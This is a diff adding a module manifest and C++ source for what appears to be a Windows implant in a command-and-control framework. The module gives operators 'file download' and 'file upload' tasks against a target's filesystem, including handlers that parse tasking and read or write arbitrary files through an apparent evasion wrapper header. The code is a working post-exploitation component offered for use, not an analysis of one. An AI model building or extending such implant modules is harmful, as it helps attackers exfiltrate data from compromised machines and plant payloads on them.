@@ -1,0 +1,37 @@
+{
+  "module": {
+    "name": "files",
+    "display_name": "File Operations",
+    "description": "Upload and download files to/from the target filesystem",
+    "category": "filesystem",
+    "removable": true
+  },
+  "sources": {
+    "files": [
+      "files.cpp",
+      "files.h"
+    ]
+  },
+  "commands": {
+    "file download": {
+      "handler": "get_file",
+      "args": [
+        "file_path"
+      ],
+      "snippet": "    else if (task_name == \"file download\") {\n        nlohmann::json result;\n\n        auto& args = task_data[\"task\"][\"args\"];\n        if (!args.contains(\"file_path\") || !args[\"file_path\"].is_string()) {\n            result[\"error\"] = \"Task failed: 'file_path' is missing or not a string.\";\n            return result;\n        }\n\n        std::string file_path = args[\"file_path\"];\n        ModuleResult module_result = get_file(file_path);\n\n        result[\"windows_error_code\"] = module_result.windows_error_code;\n        result[\"message\"] = GetErrorMessage(module_result.windows_error_code);\n        result[\"data\"] = module_result.data;\n        return result;\n    }"
+    },
+    "file upload": {
+      "handler": "put_file",
+      "args": [
+        "file_path",
+        "file_contents"
+      ],
+      "snippet": "    else if (task_name == \"file upload\") {\n        nlohmann::json result;\n\n        auto& args = task_data[\"task\"][\"args\"];\n        if (!args.contains(\"file_path\") || !args.contains(\"file_contents\")) {\n            result[\"error\"] = \"Missing required arguments: file_path or file_contents\";\n            return result;\n        }\n\n        std::string file_path = args[\"file_path\"];\n        std::vector<uint8_t> file_bytes = determine_if_argument_is_data_or_memstore_pointer(args[\"file_contents\"]);\n\n        if (file_bytes.empty()) {\n            result[\"error\"] = \"File content was empty (or invalid pointer). Wrote 0 bytes.\";\n            return result;\n        }\n\n        ModuleResult module_result = put_file(file_bytes, file_path);\n\n        result[\"windows_error_code\"] = module_result.windows_error_code;\n        result[\"message\"] = GetErrorMessage(module_result.windows_error_code);\n        result[\"data\"] = module_result.data;\n        return result;\n    }"
+    }
+  },
+  "dependencies": {},
+  "files": {
+    "files.cpp": "#include <string>\n#include <vector>\n#include \"data/structs.h\"\n#include \"defense/winapi.h\"\n#include \"_debug/debug.h\"\n\nModuleResult get_file(std::string file_path) {\n\tstd::wstring w_file_path(file_path.begin(), file_path.end());\n\n\tHANDLE h_file = WinApi::CreateFileW(\n\t\tstatic_cast<LPCWSTR>(w_file_path.c_str()),\n\t\tGENERIC_READ,\n\t\tFILE_SHARE_READ,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\tif (h_file == INVALID_HANDLE_VALUE) {\n\t\treturn { \"Could not get a handle to the file\", WinApi::GetLastError()};\n\t}\n\n\tLARGE_INTEGER size;\n\tif (!WinApi::GetFileSizeEx(h_file, &size)) {\n\t\tWinApi::CloseHandle(h_file);\n\t\treturn { \"Could not get size of file\", WinApi::GetLastError() };\n\t}\n\n\tstd::string file_contents_buffer;\n\tfile_contents_buffer.resize(static_cast<size_t>(size.QuadPart));\n\tDWORD bytes_read = 0;\n\tDWORD bytes_to_read = static_cast<DWORD>(size.QuadPart);\n\n\tBOOL read_success = WinApi::ReadFile(\n\t\th_file,\n\t\t&file_contents_buffer[0],\n\t\tbytes_to_read,\n\t\t&bytes_read,\n\t\tNULL\n\t);\n\n\tif (!read_success) {\n\t\treturn { \"File read failed\", WinApi::GetLastError() };\n\t}\n\n\tWinApi::CloseHandle(h_file);\n\treturn { file_contents_buffer, 0 };\n}\n\nModuleResult put_file(std::vector<uint8_t> file_contents, std::string file_path) {\n\tstd::wstring w_file_path(file_path.begin(), file_path.end());\n\n\tHANDLE h_file = WinApi::CreateFileW(\n\t\tstatic_cast<LPCWSTR>(w_file_path.c_str()),\n\t\tGENERIC_WRITE,\n\t\t0,\n\t\tNULL,\n\t\tCREATE_NEW,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\tif (h_file == INVALID_HANDLE_VALUE) {\n\t\treturn { \"Invalid handle to file\", WinApi::GetLastError()};\n\t}\n\n\tDWORD bytes_written = 0;\n\n\tBOOL write_file = WinApi::WriteFile(\n\t\th_file,\n\t\tstatic_cast<LPCVOID>(file_contents.data()),\n\t\tstatic_cast<DWORD>(file_contents.size()),\n\t\t&bytes_written,\n\t\tNULL\n\t);\n\n\tif (!write_file) {\n\t\tDWORD err = WinApi::GetLastError();\n\t\tWinApi::CloseHandle(h_file);\n\t\treturn { \"File write failed\", err };\n\t}\n\n\tWinApi::CloseHandle(h_file);\n\treturn { \"File written successfully\", 0 };\n}",
+    "files.h": "#pragma once\n#include <string>\n#include \"data/structs.h\"\n#include \"_debug/debug.h\"\n\nModuleResult get_file(std::string file_path);\nModuleResult put_file(std::vector<uint8_t> file_contents, std::string file_path);"
+  }
+}
